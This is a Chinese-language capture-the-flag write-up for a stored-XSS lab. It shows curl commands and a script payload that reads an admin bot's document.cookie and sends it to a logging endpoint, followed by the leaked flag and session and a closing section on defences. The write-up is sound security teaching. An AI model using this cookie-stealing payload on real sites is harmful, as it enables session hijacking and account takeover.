# 07-xss-stored-cookie 解题教程

## 1. 题目核心

题目名是 `07-xss-stored-cookie`，关键词包括：

- `xss`：跨站脚本漏洞；
- `stored`：存储型，说明 payload 会被保存到服务端；
- `cookie`：目标通常是读取管理员 Cookie；
- `flag`：Flag 很可能放在管理员 Cookie 中。

靶机是一个留言板。首页提示管理员会每 30 秒自动审核留言，因此典型攻击链是：

```text
提交恶意留言 -> 管理员机器人访问留言板 -> 执行 XSS -> 读取 document.cookie -> 外带 Cookie -> 提取 Flag
```

---

## 2. 侦察结果

访问首页：

```bash
curl -i http://127.0.0.1:33846/
```

可以看到服务端是 Flask/Werkzeug：

```http
Server: Werkzeug/3.1.8 Python/3.11.15
```

关键页面：

| 路径            | 作用                 |
| --------------- | -------------------- |
| `/`             | 首页                 |
| `/board`        | 留言板，存在提交表单 |
| `/report?c=...` | 记录外带数据         |
| `/xss-log`      | 查看外带记录         |

`/board` 表单大致如下：

```html
<form method="post">
  <input type="text" name="author" placeholder="昵称" maxlength="30" required />
  <textarea
    name="content"
    placeholder="留言内容（支持 HTML）"
    required
  ></textarea>
  <button type="submit">发布</button>
</form>
```

其中 `content` 提示“支持 HTML”，并且留言会被原样渲染，这是存储型 XSS 的入口。

---

## 3. 漏洞原理

服务端把用户提交的 `content` 保存下来，之后在 `/board` 页面直接输出，例如：

```html
<div>用户输入的 content</div>
```

如果没有进行 HTML 转义，提交：

```html
<script>
  alert(1);
</script>
```

浏览器就不会把它当作普通文本，而会当作 JavaScript 执行。

本题要读取管理员 Cookie，因此 payload 使用：

```html
<script>
  fetch(`/report?c=${encodeURIComponent(document.cookie)}`);
</script>
```

含义：

1. `document.cookie` 读取当前浏览器可访问的 Cookie；
2. `encodeURIComponent(...)` 对 Cookie 做 URL 编码，避免特殊字符破坏 URL；
3. `fetch('/report?c=...')` 请求题目内置记录接口；
4. 后续访问 `/xss-log` 即可看到外带结果。

---

## 4. 手工复现

### 4.1 提交 XSS Payload

```bash
curl -i -X POST 'http://目标地址/board' \
  --data-urlencode 'author=ctf-final' \
  --data-urlencode 'content=<script>fetch(`/report?c=${encodeURIComponent(document.cookie)}`)</script>'
```

正常情况下会返回：

```http
HTTP/1.1 302 FOUND
Location: /board
```

### 4.2 等待管理员机器人

首页提示管理员每 30 秒自动审核，所以等待 30～40 秒。

### 4.3 查看外带日志

```bash
curl -s 'http://目标地址/xss-log'
```

日志中可以看到：

```text
COOKIE=FLAG=TOGOGO-flag{}; admin_session=adminsessid_abcdef123456
```

因此 Flag 是：

```text
TOGOGO-flag{}
```

## 5. 常见坑

### 坑 1：payload 被提前编码成普通文本

不要手动把整段 payload 写成 `%3Cscript%3E...` 再当普通字符串提交。正确方式是让 HTTP 客户端对表单做编码。

`curl` 中推荐用：

```bash
--data-urlencode 'content=<script>...</script>'
```

Go 中推荐用：

```go
url.Values{}.Encode()
```

### 坑 2：误用 `curl -L -X POST`

目标提交成功后返回 `302 /board`。如果强制 `curl -L -X POST`，可能导致跟随重定向时仍用 POST，造成行为异常。建议 POST 后单独 GET。

### 坑 3：管理员未立即触发

管理员机器人约 30 秒访问一次，不是马上触发。脚本中设置了轮询等待。

---

## 6. 防御思路

如果这是实际业务系统，应这样修复：

1. **输出编码**：把用户输入当文本输出，避免浏览器解析成 HTML/JS；
2. **HTML 白名单**：如果必须支持 HTML，只允许安全标签和属性；
3. **Cookie 加 HttpOnly**：管理员 Cookie 设置 `HttpOnly` 后，JavaScript 不能通过 `document.cookie` 读取；
4. **CSP**：使用 Content-Security-Policy 禁止内联脚本；
5. **限制调试接口**：`/xss-log` 这类日志页不要公开；
6. **后台审核隔离**：管理员机器人访问用户内容时使用低权限、无敏感 Cookie 的隔离环境。

## 8. 总结

本题完整链路：

```text
/board content 存储型 XSS
        ↓
管理员机器人定时访问 /board
        ↓
执行 fetch(`/report?c=${encodeURIComponent(document.cookie)}`)
        ↓
/xss-log 记录管理员 Cookie
        ↓
提取 TOGOGO-flag{...}
```
